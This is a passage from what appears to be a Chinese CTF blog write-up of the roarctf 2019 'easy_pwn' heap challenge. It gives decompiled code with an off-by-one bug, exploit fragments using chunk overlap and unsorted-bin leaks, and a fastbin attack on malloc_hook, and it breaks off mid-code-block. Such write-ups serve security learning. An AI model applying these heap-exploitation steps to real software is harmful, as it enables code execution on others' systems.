            "content_html": "<h1 id=\"这次的题比较难搞但是攻击点挺单一过程中里到了2个手法\"><a class=\"markdownIt-Anchor\" href=\"#这次的题比较难搞但是攻击点挺单一过程中里到了2个手法\">#</a> 这次的题比较难搞，但是攻击点挺单一，过程中里到了 2 个手法</h1>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/buuoj/roarctf_2019_easy_pwn$ checksec --file=roarctf</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/buuoj/roarctf_2019_easy_pwn/roarctf&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>保护全开了，那么我们只能考虑劫持 malloc_hook, 或者 IO_FILE。这里我还是优先考虑了劫持 mallochook，使用 onegadget。还是因为 buuoj 不给 libc，虽然 ubuntu16 的 docker 容器中 glibc 通常为 ubunt11.2 或者 ubuntu11.3，但是这里还是不行，猜测可能是 11.1 的版本，这里就不过多的猜测了，泄露版本永远都不是重点和难点。</p>\n<h3 id=\"题目主要代码\"><a class=\"markdownIt-Anchor\" href=\"#题目主要代码\">#</a> 题目主要代码</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Note system&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. create a note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. write note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. drop the note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. show the note&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;5. exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实每次看这个 menu 的页面，就可以知道重点关注什么地方了。这个题呢，还是毕竟规矩的创建，编辑，输出，删除。考虑几个点有没有溢出，有没有 UAF.</p>\n<p>很遗憾这个题并没有太多的机会，只有 1 字节溢出，free 后指针清空</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_C46</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v4; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = *((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)&amp;inuse + <span class=\"number\">4</span> * i);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !(_DWORD)result )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">      size = getnum(v2);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">          size = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">        v4 = <span class=\"built_in\">calloc</span>(size, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * i) = <span class=\"number\">1</span>;</span><br><span class=\"line\">        *((_DWORD *)&amp;Size + <span class=\"number\">4</span> * i) = size;</span><br><span class=\"line\">        <span class=\"built_in\">list</span>[<span class=\"number\">2</span> * i] = v4;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the index of ticket is %d \\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">read_content</span><span class=\"params\">(__int64 a1, <span class=\"type\">int</span> size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v4; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !size )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( size &gt; v3 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(v3 + a1), size - v3);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      v3 += v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">read_size</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 &gt; (<span class=\"type\">int</span>)a2 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a2 - a1 == <span class=\"number\">10</span> )</span><br><span class=\"line\">    LODWORD(result) = a1 + <span class=\"number\">1</span>;                   <span class=\"comment\">// off_by_one</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    LODWORD(result) = a1;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//write_note</span></span><br><span class=\"line\">__int64 <span class=\"title function_\">sub_E82</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">  size = getnum(v1);</span><br><span class=\"line\">  idx = size;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &gt;= <span class=\"number\">0</span> &amp;&amp; size &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    size = *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * size);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">      size = getnum(<span class=\"number\">1</span>);</span><br><span class=\"line\">      v4 = read_size(*((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)&amp;Size + <span class=\"number\">4</span> * idx), (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size);<span class=\"comment\">// 存在1字节溢出</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">        size = read_content(<span class=\"built_in\">list</span>[<span class=\"number\">2</span> * idx], v4); <span class=\"comment\">// 不能输入少于size的内容</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//drop note</span></span><br><span class=\"line\">__int64 <span class=\"title function_\">sub_F8E</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">  idx = getnum(v3);</span><br><span class=\"line\">  v4 = idx;</span><br><span class=\"line\">  v2 = idx;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0LL</span> &amp;&amp; idx &lt;= <span class=\"number\">15LL</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = *((<span class=\"type\">int</span> *)&amp;inuse + <span class=\"number\">4</span> * idx);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * idx) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      *((_DWORD *)&amp;Size + <span class=\"number\">4</span> * idx) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)<span class=\"built_in\">list</span>[<span class=\"number\">2</span> * idx]);</span><br><span class=\"line\">      <span class=\"built_in\">list</span>[<span class=\"number\">2</span> * v2] = <span class=\"number\">0LL</span>;                       <span class=\"comment\">// 不存在uaf</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v4;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">output_content</span><span class=\"params\">(__int64 a1, <span class=\"type\">int</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> v4; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !a2 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( a2 &gt; v3 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = write(<span class=\"number\">1</span>, (<span class=\"type\">const</span> <span class=\"type\">void</span> *)(v3 + a1), a2 - v3);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      v3 += v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 <span class=\"title function_\">delete</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">  v2 = getnum(v1);</span><br><span class=\"line\">  v3 = v2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &gt;= <span class=\"number\">0</span> &amp;&amp; v2 &lt;= <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = *((_DWORD *)&amp;inuse + <span class=\"number\">4</span> * v2);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">      v2 = output_content(<span class=\"built_in\">list</span>[<span class=\"number\">2</span> * v3], *((<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)&amp;Size + <span class=\"number\">4</span> * v3));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码实现的逻辑还算比较哇民政，没有太大的问题。由于题目保护全开了，操作空间就很小。唯一的漏洞还非常明显 if (a2 - a1 == 10)<br>\n LODWORD (result) = a1 + 1;   其中 a1 是我们创建时输入的 size，a2 是我们进行 write 时输入的 size，经典的手法创建时是不进行 16 字节对齐，卡最大的堆块界限，0x88，write 时只要输入的时 0x88+10 ，就可以实现 1 字节的溢出。</p>\n<h2 id=\"解题\"><a class=\"markdownIt-Anchor\" href=\"#解题\">#</a> 解题：</h2>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>因为题目在申请堆块的时候，使用的是 calloc，会对返回的堆块进行初始化。所以我们必须构造的时堆块的重叠或者重复使用</p>\n<p>这里我们只着重介绍两种手法的实现，就不具体展示利用过程了，因为流程比较固定；</p>\n<h3 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> unlink</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x88</span>)\t\t\t<span class=\"comment\">#泄露</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">write(<span class=\"number\">2</span>,<span class=\"number\">0x68</span>+<span class=\"number\">10</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x61</span>+p64(<span class=\"number\">0x190</span>)+<span class=\"string\">b&#x27;\\x90&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n<p>这个是经典的套路了，利用 unsortedbins 的双链表绕过 unlink 的检查，成功的 chunk0 合并到 topchunk，作为新的 topchunk, 这个时候 chunk1 仍在使用，但是被包含进了 topchnk，那么我们下面如果重复申请 add (0x88),add (0x18), 就可以在 bss 的链表中两次利用了，人为的 uaf，这里的话呢，我写的 0x18 比较小，可以写大点，比如 0x88，然后重复申请后，有两个地方的指针指向这块区域，释放一个，用另外一个进行泄露（因为 0x91 的大小又被写进了 unsortedbins）这样有了 libc 的基地址。通过上述流程我们就是实现了人为的 uaf。如果我们话存在一个 0x70 大小的堆块的重复利用，就可以进行 fastbinsattack，将 malloc_hook-0x23 写入 fastbins，然后就可以可以申请出来实现 malloc_hook 的劫持。</p>\n<p>这个操作就很经典了，劫持 malloc_hook 后查看栈的结构，寻找满足要求的 onegadegt</p>\n<h3 id=\"瞎操作\"><a class=\"markdownIt-Anchor\" href=\"#瞎操作\">#</a> 瞎操作</h3>\n<p>我在第一次进行 unlink 操作时，因为不仅修改了后面堆块的堆头，还修改了假 tophcunk 的堆头，同样想利用 unsortedbin 的双链表绕过检查，但是失败了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">b&#x27;\\xb0&#x27;</span>)</span><br><span class=\"line\">write(<span class=\"number\">2</span>,<span class=\"number\">0x18</span>+<span class=\"number\">10</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0xb0</span>)+<span class=\"string\">b&#x27;\\x91&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>)</span><br></pre></td></tr></table></figure>\n<p>但是，却误打误撞的绕过了 unsortedbins 的检查，如果释放 1，然后修改他的 size（0x90—&gt;0xb0）, 期望能够切割堆块 (0x90)，然后剩下的 0x20 会被加入对应的 bins，这里会报错我还没有搞清楚原因，报错的信息大概是 prevsize 不合法。</p>\n<p>然后我的瞎操作就饶过了一系列的检查，虽然没能构造新的 topchunk, 但是 chunk1 的紧邻堆块 2 是我们在使用的，当我们 add (0x88)，会对其进行切割，剩下的 0x20 会进入 unsortedbin 的双链表，而这剩下的就是我们使用的 chunk2，这样 chunk 的 fd,bk 指针指向 main_arena，这样既可以完成了泄露</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: <span class=\"number\">0x55ad680a80b0</span> —▸ <span class=\"number\">0x7f39d1cdab78</span> (main_arena+<span class=\"number\">88</span>) ◂— <span class=\"number\">0x55ad680a80b0</span></span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>gx <span class=\"number\">0x55ad680a80b0</span></span><br><span class=\"line\"><span class=\"number\">0x55ad680a80b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000021</span></span><br><span class=\"line\">pwndbg&gt; </span><br></pre></td></tr></table></figure>\n<p>然后申请出来</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x55ad67ba8040</span>:\t<span class=\"number\">0x0000001800000001</span>\t<span class=\"number\">0x000055ad680a8010</span></span><br><span class=\"line\"><span class=\"number\">0x55ad67ba8050</span>:\t<span class=\"number\">0x0000008800000001</span>\t<span class=\"number\">0x000055ad680a8030</span></span><br><span class=\"line\"><span class=\"number\">0x55ad67ba8060</span>:\t<span class=\"number\">0x0000001800000001</span>\t<span class=\"number\">0x000055ad680a80c0</span></span><br><span class=\"line\"><span class=\"number\">0x55ad67ba8070</span>:\t<span class=\"number\">0x0000001000000001</span>\t<span class=\"number\">0x000055ad680a80c0</span></span><br></pre></td></tr></table></figure>\n<p>就可以重复利用，我们利用 chunk1 来修改 chunk 的 size（0x21----&gt;0x71），这样当 chunk2 释放后门进入 fastbin, 利用 chunk3 修改 fd 指针，就把 malloc_hook 链接入 fastbins。free chnnk  进入 fastbins 时，要保证 chunk 的下一个 chunk 合法，但是只会检查 size，这里我直接申请一个堆块绕过，后面申请到 aimed_chunk 就比较简单了。</p>\n<p>最后就是这个 onegadegt 了，很不幸这里没有合适的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span 